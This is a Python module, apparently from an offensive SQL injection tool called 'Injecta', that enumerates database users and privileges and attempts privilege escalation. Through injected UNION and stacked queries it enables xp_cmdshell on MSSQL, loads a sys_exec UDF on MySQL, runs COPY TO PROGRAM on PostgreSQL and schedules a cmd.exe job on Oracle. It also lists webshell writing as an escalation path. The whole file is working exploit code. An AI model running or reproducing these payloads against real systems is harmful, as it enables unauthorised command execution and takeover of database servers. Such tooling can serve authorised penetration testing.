"""
Injecta — Privilege escalation detection & exploitation
"""
import re
from typing import Any, Dict, List, Optional, Tuple


ADMIN_KEYWORDS = [
    "super_priv|y|Y|1", "is_srvrolemember|1|1", "usesuper|true",
    "session_roles|dba", "sysdba|true",
]


class PrivilegeEscalation:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "unknown") if payloads else "unknown"
        self._user_cache: Optional[Dict[str, Any]] = None

    def enumerate_privileges(self, url: str, param: str) -> Dict[str, Any]:
        self.log.info(f"Enumerating privileges on {self.dbms}...")
        result = {"user": None, "is_admin": False, "privileges": [], "escalation_paths": []}

        user = self._get_current_user(url, param)
        result["user"] = user

        privs = self._get_privileges(url, param)
        result["privileges"] = privs

        is_admin = self._check_is_admin(url, param)
        result["is_admin"] = is_admin

        result["escalation_paths"] = self._find_escalation_paths(is_admin, privs)

        if is_admin:
            self.log.ok(f"User '{user}' has administrative privileges")
        else:
            self.log.warn(f"User '{user}' is not admin. Escalation paths: {len(result['escalation_paths'])}")
            for path in result["escalation_paths"]:
                self.log.raw(f"  -> {path}")

        return result

    def attempt_escalation(self, url: str, param: str) -> Dict[str, Any]:
        self.log.info("Attempting privilege escalation...")
        result = {"success": False, "technique": None, "output": []}

        methods = self._get_escalation_methods()
        for method_name, queries in methods.items():
            for q in queries:
                for wrapper in [f"1; {q}", f"'; {q}-- -", f"1'; {q}-- -"]:
                    _, resp_text, _ = self.req.test_raw(url, wrapper, param)
                    if resp_text and not self._is_error(resp_text):
                        output = self._extract_output(resp_text)
                        if output or method_name not in result.get("_skip_success", []):
                            result["success"] = True
                            result["technique"] = method_name
                            result["output"] = output
                            self.log.ok(f"Escalation via {method_name}: OK")
                            return result
            self.log.debug2(f"Escalation {method_name} failed")

        self.log.warn("No escalation method succeeded")
        return result

    def _get_current_user(self, url: str, param: str) -> str:
        queries = self.payloads.current_user() if hasattr(self.payloads, "current_user") else []
        for q in queries:
            payload = f"' UNION {q}-- -"
            _, resp_text, _ = self.req.test_raw(url, payload, param)
            if resp_text:
                match = re.search(r"([\w\-.\\]+@?[\w\-.]+|\w+)", resp_text)
                if match:
                    u = match.group(1)
                    if u and len(u) < 100 and u not in ("1", "0"):
                        return u
        return "unknown"

    def _get_privileges(self, url: str, param: str) -> List[str]:
        queries = self.payloads.privileges() if hasattr(self.payloads, "privileges") else []
        privs = set()
        for q in queries:
            payload = f"' UNION {q}-- -"
            _, resp_text, _ = self.req.test_raw(url, payload, param)
            if resp_text:
                found = re.findall(r"([\w_]+(?:\s*,\s*[\w_]+)*)", resp_text)
                for f in found:
                    for p in f.split(","):
                        p = p.strip()
                        if p and len(p) < 50 and not p.isdigit() and not p.startswith("<"):
                            privs.add(p)
        return list(privs)

    def _check_is_admin(self, url: str, param: str) -> bool:
        queries = []
        if hasattr(self.payloads, "is_admin"):
            queries = self.payloads.is_admin()

        if self.dbms == "mssql" and hasattr(self.payloads, "is_sysadmin"):
            queries = self.payloads.is_sysadmin()

        if not queries:
            return False

        for q in queries:
            payload = f"' UNION {q}-- -"
            _, resp_text, _ = self.req.test_raw(url, payload, param)
            if resp_text and ("1" in resp_text or "true" in resp_text.lower() or "Y" in resp_text):
                stripped = re.sub(r"<[^>]+>", "", resp_text).strip()[:100]
                if re.search(r"\b[1Y]\b", stripped):
                    return True
        return False

    def _find_escalation_paths(self, is_admin: bool, privileges: List[str]) -> List[str]:
        paths = []
        if is_admin:
            return paths

        if self.dbms == "mysql":
            if "FILE" in str(privileges).upper():
                paths.append("FILE privilege: write webshell via INTO OUTFILE")
            paths.append("Check for MySQL UDF library injection (sys_exec/mysqludf)")

        elif self.dbms == "mssql":
            paths.append("Enable xp_cmdshell via sp_configure (requires sysadmin)")
            paths.append("Use stacked queries for EXEC statements")

        elif self.dbms == "postgresql":
            paths.append("COPY FROM PROGRAM (requires superuser)")

        elif self.dbms == "oracle":
            paths.append("DBMS_SCHEDULER job execution via stacked queries")

        return paths

    def _get_escalation_methods(self) -> Dict[str, List[str]]:
        methods = {}

        if self.dbms == "mssql":
            methods["enable_xp_cmdshell"] = [
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
            ]

        elif self.dbms == "mysql":
            methods["udf_inject"] = [
                "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so'",
                "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.dll'",
            ]

        elif self.dbms == "postgresql":
            methods["copy_program"] = [
                "COPY (SELECT 1) TO PROGRAM 'whoami'",
            ]

        elif self.dbms == "oracle":
            methods["dbms_scheduler"] = [
                "BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'INJECTA_JOB',job_type=>'EXECUTABLE',job_action=>'cmd.exe /c whoami',enabled=>TRUE); END;",
            ]

        return methods

    def _is_error(self, text: str) -> bool:
        keywords = ["error", "warning", "syntax", "permission denied", "denied", "ORA-"]
        return any(kw in text.lower() for kw in keywords)

    def _extract_output(self, text: str) -> List[str]:
        stripped = re.sub(r"<[^>]+>", "", text)
        lines = [l.strip() for l in stripped.split("\n") if l.strip()]
        return [l for l in lines if len(l) > 1 and not self._is_error(l)][:30]
